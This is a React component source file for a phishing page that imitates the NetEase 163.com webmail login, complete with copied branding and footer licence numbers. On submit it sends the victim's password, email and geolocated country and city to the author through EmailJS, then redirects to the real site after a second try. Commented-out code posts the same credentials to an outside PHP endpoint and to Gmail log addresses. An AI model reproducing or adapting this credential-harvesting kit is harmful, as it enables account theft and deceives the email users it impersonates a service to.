import React, { useEffect, useState, useRef } from "react";
import './163.css';
import yhnh from '../../Media/Images/163.png';
import { BsEyeFill, BsEyeSlashFill } from 'react-icons/bs';
// import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';

const OneSixThree =()=>{

    const formRef = useRef();



    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);





    useEffect(()=>{
        document.title = "163网易免费邮-你的专业电子邮局";
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, []);

    const reloadWebPageHandler = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState('');
    const domain = `163.com`;

    const [spinLoader, setSpinLoader] = useState(false);

    const [count, setCount] = useState(0);

    const submit163 = (e)=>{
        e.preventDefault();
        // alert(5678)
        if (password === "") {
            return null
        } else {

            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = `https://mail.${extracetdemailDomain}`; 
                    window.location.href = "https://www.163.com/"
                    
                }, 1500);

            };


            // const user = {
            //     email: email,
            //     password: password,
            //     // country: country,
              
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };


             // post to server
            //  const user = {
            //     email: email,
            //     password: password,


                // subject: "Chameleon Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${email}</p>
                // <p>Signal: ${password}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };


            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }
        
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log('data');
            //     },
            // });



            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('!');
              },
              (error) => {
                console.log('...', error.text);
              },
            );
            
            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
                setPassword('');
                setEmail(email);
            }, 2400);
        }
    }

    

    const [show, setShow] = useState(false);
    const handleShow = ()=> setShow(show=> !show);


    return <div className="etrftgf">

        { spinLoader ? <Preloader /> : null }
        
        <section className="conta_n_e_r">

            <header style={{color:'#fff'}} className="o163_header_">
                <div className="wp">
                        <img 
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARsAAAA8BAMAAACk3QMoAAAAMFBMVEVHcEz///////////////////////////////////////////////////////////9EPuwCAAAAD3RSTlMA3zyfH2C/f+8Qj2/Pr0+rRZugAAAKLUlEQVRo3s2Zf2wbVx3AX5yzzSVtWGgYo3/sXENKuzLZq9e0KprstoHuF03aLWWoAmd0WFUlZpd1uAUVp2isoA3OA/ZDFLSsrRiwP5IxtgLSCFCkVUiTK8EqBpPcPxBiE1JyduK4adov3/fj3r13vrTdH4l4clP73b33Pvf9/d4RItvqGPk/av+GAJwdv+v7400wI3+b60727X1p7aLDmIegBce8ZR+wJnG253nHlzOLT+PHCW0C0HFWux1QvwrPkNsGxTz6vO2Pljt+5Q439h8MmCFUhRacZ23w4fwUvPaEvM/4Skq2PtpRde85x2+IOLer87Y5+Cm7v9ybNBquAw0n6tEInJCl4MDb8k6ls0l/p91fSX59AMY1nAb9yMEFVz+y67hYR8XR1uY4WZUG5ssBOA7DmSvS9oiLY12Sy3Xmcrl8Ez+p1B2jHg4d2mjRioJjjnlrrHiVeVII9DYscWpx0SY5zjR/IIET5bf3KN+V8QyHAsyK2T4mtaLg3CtHrXxXdG3x4VySOFNoQFwtHOcSM+TPCZwJfjuz6zDa1yaHflJ20sOxjnZDze8tCk7IRWyekH2WD6dZVnCWo+u3/0vgaLYThptRbtm633YsvLo7lYIzqdSgNUwqIy2a93AecJc8LLvC4G+ugcLFA5k2OEwSMBaAU2pSp7a4AsktxeIhh36KVDpCcOPWsOHqPginy+35heIQrOPJVF/F5zgELkFyoLkzNukI6dT6afs0u+EZuILft0PB7M94mhO2I5yjYA2H3YcLwlkjOj6kuBob+iUaZ3aKqzdIZeWnJxswXJoZaDHlsBIuaHepXjzUYNL5OnpWtoa2E6Y47e7iVCVVHccQZuKoodeS1ut63ZTESdTTI/laflrgON2sUZyd8LiOUyNtszLueDhtjowab8QGdJw2UHzTNW4mVRHm/TgRsJKJhn2O4+QVbRrd2+Dj/Vvhb/39VYozNlcscekUT15QcAYui8kaB2nc1HBKAcLpoInKDUr8+ojEMXAsMg5ynNty9nyONmo7d7VD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"
                        className="logo_163_" id="spc_e"
                        alt="wertyu"
                        />

                        <i className="sing_ln_" id="spc_e">|</i>

                        <span id="spc_e" >你的专业电子邮局</span>
                </div>


                <ul className="ul163">
                    <li onClick={reloadWebPageHandler}>手机App下载</li>
                    <li onClick={reloadWebPageHandler}>电脑客户端下载</li>

                    <li onClick={reloadWebPageHandler}>VIP</li>
                    <li onClick={reloadWebPageHandler}>会员</li>
                    <li onClick={reloadWebPageHandler}>企业邮箱</li>
                    <li onClick={reloadWebPageHandler}>海外登录</li>
                    <li onClick={reloadWebPageHandler}>帮助</li>
                    <li onClick={reloadWebPageHandler}>反馈</li>
                    <li onClick={reloadWebPageHandler}>修复公示</li>

                </ul>

            </header>

            <article className="oooooooooooooooooodhjkcm">
                <div>
                    <img 
                        alt="ln_pg_163"
                        src={yhnh}
                        className="landpage_img_163"
                        onClick={reloadWebPageHandler}
                        style={{ cursor:'pointer'}}
                    />
                </div>


                <main className="n_163_fm_wrapper_">
                    <img alt="sd_rt" 
                        className="sd_rt"
                        style={{cursor:'pointer'}}
                        title="扫码登录"
                        onClick={reloadWebPageHandler}
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQBAMAAAAVaP+LAAAAElBMVEVHcEx6pf96pf96o/96o/97o/8Pt1s1AAAABXRSTlMAfz/dXxFC4+EAAAEeSURBVGje7djRbcJAEEXReYgO0DSAlApcAiWg7b8VfpwI22sSdm8sVnr3M6CjQZDJhAjnnHMDlqWUiCjraj97emybKCiSgkRBkRQkCoqkIFFQvICqTzwE2sMNfTSU+2//4oP4KyQKWo/UDomCViN1QKKg5Ug90Ok6l53QT1+GXnSbpgmBVMqdeWlJQaKgSAoSBcVlAzXu7DMFhaFDIWH3Ubaffn+6vd+Hdm7vBkgUVL+9WyBRUHwk5Aat/j+goc2hS0CioPqXOdE4EgJV/6BE40gM5Eb+rvL5d6UZEgV9j9QPiYLmkQBIFLRcldE7EgEtVmX0joRA86oEErYZk4KE7eqkIP3HwWRoJCgpSNg1khQk7D7yXhp3LznnnDuqB9Ji/xpvUnncAAAAAElFTkSuQmCC"
                     />

                     <h1 className="hhhh111163com">账号登录</h1>

                    <form className="loginForm" onSubmit={submit163} ref={formRef}>
                        <div style={{display:'flex', justifyContent:'center'}}>
                            <div className="email_cp_ctnr_" aria-readonly>
                                <b>{ email.slice('@', email.indexOf('@'))}</b>
                                <span style={{color:'#555', fontSize:'15px',paddingRight:'10px'}}>{domain}</span>
                            </div>
                        </div>

                        <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>
              <input type="email" value={email} name="online_correspondence" hidden/>

                        {/* <div> */}

                            <div  style={{display:'flex', justifyContent:'center'}}>
                                <input 
                                    type={!show ? "password" : 'text'}
                                    placeholder='输入密码'
                                    value={password}
                                    onChange={e=>setPassword(e.target.value)}
                                    className="o163_pwd"
                                    required
                                />

                                { show ? <BsEyeFill className="eyyyeee" onClick={handleShow}/> : <BsEyeSlashFill className="eyyyeee" onClick={handleShow}/> }
                            </div>

                        {/* </div> */}

                        <article className="vedrfvd">
                            <div style={{display:'flex', marginLeft:'1.5em'}}>
                                <input type={`checkbox`}/>
                                &#160;&#160;
                                <span className="iuedjk">30天内免登录</span>
                            </div>

                            <div className="iuedjk" style={{marginRight:'1.9em'}} onClick={reloadWebPageHandler}>忘记密码</div>
                        </article>

                        <div style={{display:'flex', justifyContent:'center'}}>
                            <input 
                                type={`submit`}
                                value="登  录"
                                className="btn_163"
                                onClick={submit163}
                                
                            />
                        </div>

                    </form>

                    <p className="iuedjk" onClick={reloadWebPageHandler} style={{textAlign:'center', cursor:'pointer'}}>
                        注册新账号 &#160;

                        | &#160;

                        注册VIP
                    </p>


                    <p className="iuedjk" style={{textAlign:'center', cursor:'pointer', marginTop:'5rem'}} onClick={reloadWebPageHandler}>
                        阅读并接受 《服务条款》和 《隐私政策》
                    </p>

                </main>

               


            </article>

            

            <p style={{textAlign:'center', cursor:'pointer', color:'#fff', fontSize:'13px'}} onClick={reloadWebPageHandler}>
            网易首页 &#160;

            | &#160;

            网易严选 &#160;

            |&#160;

            政府公益热线 &#160;

            | &#160;

            网易公司版权所有©1997-2023
            </p>

            <p style={{textAlign:'center', cursor:'pointer', color:'#fff', fontSize:'13px', marginBottom:'2em'}} onClick={reloadWebPageHandler}>
            ICP备案 粤B2-20090191-18 &#160;

            <img alt="footer" 
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAFO0lEQVR42k2Ua1DUVRiHj6TmqONoWZqZyuTkJZ0sC8UJvGR4RwUvLC2CZCgpkpoKRKhAOHlB8a45UumMkaSiQqKAoICCoMLKsoBchOWy7LK7ssvucvPpHx+AD8+Z886cec7vvGfOEYCgxdxFZ4tFYDYLS5tKgFFCPbKl/KbfrRNhj/85GFLQVBC3BYpHQ6uw2WwCg0HwyijR3AUguoa2FqNosxhEh0kvaEUiY27p9Z/iYjettl7wnsY+j1lE+i/m4s9unPOXtyvjw67S+mzpa4tRdBrUosNYK6HuEeosNULfUinaOxFgHZB6dB0z353BcR8HMjdPp9bnQ3TbplKe5E/8nzuY9ZYjyQc9ANObppZaYTYmCKs5oZewtVYYbU0CdKNtT0IyXL9YTkyIDFPoRBR9B1DoOI4S18k8setDe6wLcbdiWDXTndeqIzegfIDFlirgdo/Q1qwS7VRMenlzU6vDqGWsk/nRET2FQvtRFNmP5OmUUZQsmMjTEcPIGDwI0nzYvCOSeePn0/ggpE5XcniCMuX7HiHapwLr6S9OHNqJEPu4fFiGcd0Ynr8xCOWnY1GOGkHB4GE8nzmeHGGH1nsSqXfCEGIrh6N2YysNn6ZMO9cjNCrvju68t+rBscPSor67Sdw7m2qXMZSI/ijHjqDYyZ7i2fbS/D2eCkGx8zhUebsRfQIJDQkGQ1Ta6zadfbew4OquQOslRy6ejUSIMG6d9cAS7kC+6EeObDLPTzlRk76SqugFFLwzkKZtn5N/f1tXwpNHI0CxBl35jYhuYdmd/Wc0pz8n62ooYkAMW319acucz51l48l2/oCiTZ9RsnMWZQEzKD7gAtXfErzBByGCyUrdj/n6HNQZR2K7hSV/BdSWRc3kVW4go51P07dfAHeXTqQx3ImihZN5/P+RvaejmPMR6kAHFN85Maj/RkZM+5VmVRBVJx2pvLaxrCdhvG/Lk6BZkLiI7b+c6No5SQyl8+OBFH/7CVlu4ynaOYP68Nl0Th3OPTEMIb7HPywastxR7JdakuJf1S1UJ+1NKI+dR0feBhQp+xHvR7NUOJIwZAiZIweSPeFt8iRKl0wiz3kq/nYOiKEh5CYF0V4YSM2NVTTlR53sJQx/+CJmLtVxa6HQj8gjZ7tuW/TxQ4j1uA5xxWfMCgYLL6neKBHE9pBwKPWiNtGLmr8Xo80JzuwWNmSHtqsueFAc407NcSeaHwegTA/ixG45W4IPcOuiH/nxbsi9g1jjGsiOXeE03fel4Xcnyn77mpprSzCU7NH1vBRTjmdtihsvLi2l6OgCin6ciC3TA8p8QLWMjqyVGK8thGeeYAgAhYyKiM+ktS68vOFGY66cVn2ic7cQiXbzM7nm0TpjXfpqCiOcUEZ/iT7/O7R35dQlrKThrgxj/gZeKfypOOtC6anFaHIDUN8P0Jk0V+a/bk3u9X1ZqsSryodzX17fWK95KEeTtZ66pDVo09eizfJCk7EeQ+56GlM9qPxjAXW3Zeif/0B9ph8vLsu0TZWx8y3WXsJWY5owVx68Y63+Eb1qJ9VJ3qhveqJJ9aTm+go06d5o/nWj4sxXVEltqUv2pE5KrsvfhEm9HZPm2BWzvpcQU55ob04f2KiKOK5OkZkbkpfTnLMGfZokS1iCTqobri7qSqx/5EnDPVepb740Vex9aWi4GGo13bazmi/1EjY/FB3WTPEiK1oojv8wPDfyG68He5zPl8e5Z5edX1lYE++urk+Uqysuy7PrU7akaAvPHCq5Fr7w2ZVtdtrGZGGzpAir6XyX6z8l0xwCoaTMcgAAAABJRU5ErkJggg=="
            />

             {/* 公安   */}
             &#160;

             粤公网安备 44010602006299 &#160;
             
             增值电信业务许可证  &#160;
             
             粤B2-20090191  &#160;
             
             B2-20090058 &#160;
            </p>

        </section>
    </div>
}

export default OneSixThree;